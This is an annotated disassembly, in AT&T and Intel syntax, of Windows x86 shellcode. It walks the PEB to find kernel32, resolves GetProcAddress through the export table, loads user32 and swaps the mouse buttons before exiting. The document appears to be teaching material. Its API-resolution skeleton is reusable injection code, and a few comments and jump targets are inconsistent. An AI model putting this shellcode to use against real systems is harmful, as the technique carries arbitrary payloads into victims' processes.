
/**************************************************************************************************************************
						Disassembly in AT&T Syntax
***************************************************************************************************************************/

Section 1: Find kernel32.dll base address

   0: 31 c0                    xor    %eax,%eax			// EAX = 0
   1: 64 8b 60 08              mov    %fs:0x8(%eax),%esp	// Move Segment:Offset(base) to ESP
   2: 8d 2c 24                 lea    (%esp),%ebp		// Load effective address specified by ESP to EBP (Creates virtual stack)
   3: 31 c0                    xor    %eax,%eax			// EAX = 0
   4: 64 8b 58 30              mov    %fs:0x30(%eax),%ebx	// EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
   5: 8b 5b 0c                 mov    0xc(%ebx),%ebx		// EBX = PEB_LDR_DATA // Using offset 0xc
   6: 8b 5b 14                 mov    0x14(%ebx),%ebx		// EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
   7: 8b 1b                    mov    (%ebx),%ebx		// EBX = Second list entry (ntdll.dll)
   8: 8b 1b                    mov    (%ebx),%ebx		// EBX = Third list entry (kernel32.dll)
   9: 8b 5b 10                 mov    0x10(%ebx),%ebx		// EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

   10: 8b 53 3c                mov    0x3c(%ebx),%edx		// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
   11: 03 d3                   add    %ebx,%edx			// EDX = Address of PE signature = base address + RVA of PE signature
   12: 8b 52 78                mov    0x78(%edx),%edx		// EDX = RVA of Export Table = Address of PE + offset 0x78
   13: 03 d3                   add    %ebx,%edx			// EDX = Address of Export Table = base address + RVA of export table
   14: 8b 72 20                mov    0x20(%edx),%esi		// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
   15: 03 f3                   add    %ebx,%esi			// ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
   16: 33 c9                   xor    %ecx,%ecx			// ECX = 0

  loopSearch:
   17: 41                      inc    %ecx			// Increment counter ECX
   18: ad                      lods   %ds:(%esi),%eax		// Load next list entry into EAX
   19: 01 d8                   add    %ebx,%eax			// EAX = Address of Entry = base address + Address of Entry
   20: 81 38 47 65 74 50       cmpl   $0x50746547,(%eax)	// Compare first byte to GetP
   21: 75 f4                   jne    0x403051			// Start over if not equal
   22: 81 78 04 72 6f 63 41    cmpl   $0x41636f72,0x4(%eax)	// Compare second byte to rocA
   23: 75 eb                   jne    0x403051			// Start over if not equal

  getProcAddressFunc:
   24: 8b 7a 24                mov    0x24(%edx),%edi		// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
   25: 01 df                   add    %ebx,%edi			// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
   26: 66 8b 0c 4f             mov    (%edi,%ecx,2),%cx		// CX = Number of Function = Address of Ordinal Table + Counter * 2
   27: 49                      dec    %ecx			// Decrement ECX (As name ordinals starts from 0)
   28: 8b 7a 1c                mov    0x1c(%edx),%edi		// EDI = Offset address table
   29: 01 df                   add    %ebx,%edi			// EDI = Offset address table
   30: 8b 3c 8f                mov    (%edi,%ecx,4),%edi	// EDI = Pointer(Offset)
   31: 01 df                   add    %ebx,%edi			// EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

  getLoadLibraryA:
   32: 31 c9                   xor    %ecx,%ecx			// ECX = 0
   33: 51                      push   %ecx			// Push ECX onto stack
   34: 68 61 72 79 41          push   $0x41797261		//
   35: 68 4c 69 62 72          push   $0x7262694c		// AyrarbiLdaoL
   36: 68 4c 6f 61 64          push   $0x64616f4c		//
   37: 54                      push   %esp			// "LoadLibraryA"
   38: 53                      push   %ebx			// "Kernel32.dll"
   39: ff d7                   call   *%edi			// GetProcAddress(Kernel32.dll,LoadLibraryA)

  getUser32:
   40: 68 6c 6c 61 61          push   $0x61616c6c		// aall
   41: 66 81 6c 24 02 61 61    subw   $0x6161,0x2(%esp)		// Remove additional characters "aa"
   42: 68 33 32 2e 64          push   $0x642e3233		// d.32
   43: 68 55 73 65 72          push   $0x72657355		// resU
   44: 54                      push   %esp			// User32.dll
   45: ff d0                   call   *%eax			// Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

   46: 68 74 6f 6e 61          push   $0x616e6f74		// anot
   47: 83 6c 24 03 61          subl   $0x61,0x3(%esp)   	// Remove "a"
   48: 68 65 42 75 74          push   $0x74754265       	// tuBe
   49: 68 4d 6f 75 73          push   $0x73756f4d       	// suoM
   50: 68 53 77 61 70          push   $0x70617753       	// pawS
   51: 54                      push   %esp              	// "SwapMouseButton"
   52: 50                      push   %eax              	// user32.dll address
   53: ff d7                   call   *%edi             	// GetProc(SwapMouseButton)

Section 6: Call SwapMouseButton

   54: 83 c4 14                add    $0x14,%esp  		// Clean stack
   55: 33 c9                   xor    %ecx,%ecx   		// ECX = 0
   56: 41                      inc    ecx			// ECX = 1
   57: 51 	               push   %ecx        		// Set to true
   58: ff d0                   call   *%eax       		// Swap

Section 7: Get ExitProcess function address

   59: 83 c4 10                add    $0x10,%esp		// Clean Stack
   60: 68 65 73 73 61          push   $0x61737365		// asse
   61: 66 83 6c 24 03 61       subw   $0x61,0x3(%esp)		// Remove the 'a'
   62: 68 50 72 6f 63          push   $0x636f7250		// corP
   63: 68 45 78 69 74          push   $0x74697845		// tixE
   64: 54                      push   %esp			// "ExitProcess"
   65: 53                      push   %ebx			// "Kernel32.dll"
   66: ff d7                   call   *%edi			// GetProcAddress(Kernel32.dll, ExitProcess)

Section 8: Call the ExitProcess function

   67: 31 c9                   xor    %ecx,%ecx			// ECX = 0
   68: 51                      push   %ecx			// Push 0
   69: ff d0                   call   *%eax			// ExitProcess(0)


/**************************************************************************************************************************
						Disassembly in Intel Syntax
***************************************************************************************************************************/


Section 1: Find kernel32.dll base address

    0: 31 c0                    xor    eax,eax                      	// EAX = 0
    1: 64 8b 60 08              mov    esp,DWORD PTR fs:[eax+0x8]   	// Move Segment:Offset(base) to ESP
    2: 8d 2c 24                 lea    ebp,[esp]                    	// Load effective address specified by ESP to EBP (Creates virtual stack)
    3: 31 c0                    xor    eax,eax                      	// EAX = 0
    4: 64 8b 58 30              mov    ebx,DWORD PTR fs:[eax+0x30]  	// EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
    5: 8b 5b 0c                 mov    ebx,DWORD PTR [ebx+0xc]     	// EBX = PEB_LDR_DATA // Using offset 0xc
    6: 8b 5b 14                 mov    ebx,DWORD PTR [ebx+0x14]     	// EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
    7: 8b 1b                    mov    ebx,DWORD PTR [ebx]          	// EBX = Second list entry (ntdll.dll)
    8: 8b 1b                    mov    ebx,DWORD PTR [ebx]          	// EBX = Third list entry (kernel32.dll)
    9: 8b 5b 10                 mov    ebx,DWORD PTR [ebx+0x10]     	// EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

    10: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]     	// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    11: 03 d3                   add    edx,ebx                      	// EDX = Address of PE signature = base address + RVA of PE signature
    12: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]     	// EDX = RVA of Export Table = Address of PE + offset 0x78
    13: 03 d3                   add    edx,ebx                      	// EDX = Address of Export Table = base address + RVA of export table
    14: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]     	// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
    15: 03 f3                   add    esi,ebx                      	// ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
    16: 33 c9                   xor    ecx,ecx                      	// ECX = 0

   loopSearch:
    17: 41                      inc    ecx                             // Increment counter ECX
    18: ad                      lods   eax,DWORD PTR ds:[esi]          // Load next list entry into EAX
    19: 01 d8                   add    eax,ebx                         // EAX = Address of Entry = base address + Address of Entry
    20: 81 38 47 65 74 50       cmp    DWORD PTR [eax],0x50746547      // Compare first byte to GetP
    21: 75 f4                   jne    0x2d                            // Start over if not equal
    22: 81 78 04 72 6f 63 41    cmp    DWORD PTR [eax+0x4],0x41636f72  // Compare second byte to rocA
    23: 75 eb                   jne    0x2d                            // Start over if not equal

   getProcAddressFunc:
    24: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]        // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
    25: 01 df                   add    edi,ebx                         // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
    26: 66 8b 0c 4f             mov    cx,WORD PTR [edi+ecx*2]         // CX = Number of Function = Address of Ordinal Table + Counter * 2
    27: 49                      dec    ecx                             // Decrement ECX (As name ordinals starts from 0)
    28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]        // EDI = Offset address table
    29: 01 df                   add    edi,ebx                         // EDI = Offset address table
    30: 8b 3c 8f                mov    edi,DWORD PTR [edi+ecx*4]       // EDI = Pointer(Offset)
    31: 01 df                   add    edi,ebx                         // EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

    32: 31 c9                   xor    ecx,ecx                         // ECX = 0
    33: 51                      push   ecx                             // Push ECX onto stack
    34: 68 61 72 79 41          push   0x41797261                      //
    35: 68 4c 69 62 72          push   0x7262694c                      // AyrarbiLdaoL
    36: 68 4c 6f 61 64          push   0x64616f4c                      //
    37: 54                      push   esp                             // "LoadLibraryA"
    38: 53                      push   ebx                             // "Kernel32.dll"
    39: ff d7                   call   edi                             // GetProcAddress(Kernel32.dll,LoadLibraryA)

   getUser32:
    40: 68 6c 6c 61 61          push   0x61616c6c                      // aall
    41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161       // Remove additional characters "aa"
    42: 68 33 32 2e 64          push   0x642e3233                      // d.32
    43: 68 55 73 65 72          push   0x72657355                      // resU
    44: 54                      push   esp                             // User32.dll
    45: ff d0                   call   eax                             // Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

    46: 68 74 6f 6e 61          push   0x616e6f74			// anot
    47: 83 6c 24 03 61          sub    DWORD PTR [esp+0x3],0x61		// Remove "a"
    48: 68 65 42 75 74          push   0x74754265			// tuBe
    49: 68 4d 6f 75 73          push   0x73756f4d			// suoM
    50: 68 53 77 61 70          push   0x70617753			// pawS
    51: 54                      push   esp				// "SwapMouseButton"
    52: 50                      push   eax				// user32.dll address
    53: ff d7                   call   edi				// GetProcAddress(User32.dll, SwapMouseButton)

Section 6: Call SwapMouseButton

    54: 83 c4 14                add    esp,0x14				// Clean stack
    55: 33 c9                   xor    ecx,ecx				// ECX = 0
    56: 41                      inc    ecx				// ECX = 1
    57: 51                      push   ecx				// Set to true
    58: ff d0                   call   eax				// Swap

Section 7: Get ExitProcess function address

    59: 83 c4 10                add    esp,0x10				// Clean Stack
    60: 68 65 73 73 61          push   0x61737365			// asse
    61: 66 83 6c 24 03 61       sub    WORD PTR [esp+0x3],0x61		// Remove the 'a'
    62: 68 50 72 6f 63          push   0x636f7250			// corP
    63: 68 45 78 69 74          push   0x74697845			// tixE
    64: 54                      push   esp				// "ExitProcess"
    65: 53                      push   ebx				// "Kernel32.dll"
    66: ff d7                   call   edi				// GetProcAddress(Kernel32.dll, ExitProcess)

Section 8: Call the ExitProcess function

    67: 31 c9                   xor    ecx,ecx				// ECX = 0
    68: 51                      push   ecx				// Push 0
    69: ff d0                   call   eax				// ExitProcess(0)

